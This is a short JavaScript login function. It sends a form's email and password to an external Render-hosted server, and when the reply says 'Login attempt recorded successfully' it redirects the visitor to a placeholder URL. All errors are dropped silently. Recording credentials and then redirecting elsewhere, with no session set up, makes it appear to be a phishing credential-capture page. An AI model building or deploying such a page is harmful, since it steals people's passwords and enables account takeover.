function handleLogin() {
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    
    if (!email || !password) {

        return;
    }

    fetch('https://arsa-back.onrender.com/login', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        },
        body: JSON.stringify({
            email: email,
            password: password
        })
    })
    .then(response => {
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        return response.json();
    })
    .then(data => {
        if (data.message === 'Login attempt recorded successfully') {
            window.location.href = 'https://your-redirect-url.com';
        } else {
    
        }
    })
    .catch(error => {

    });
}
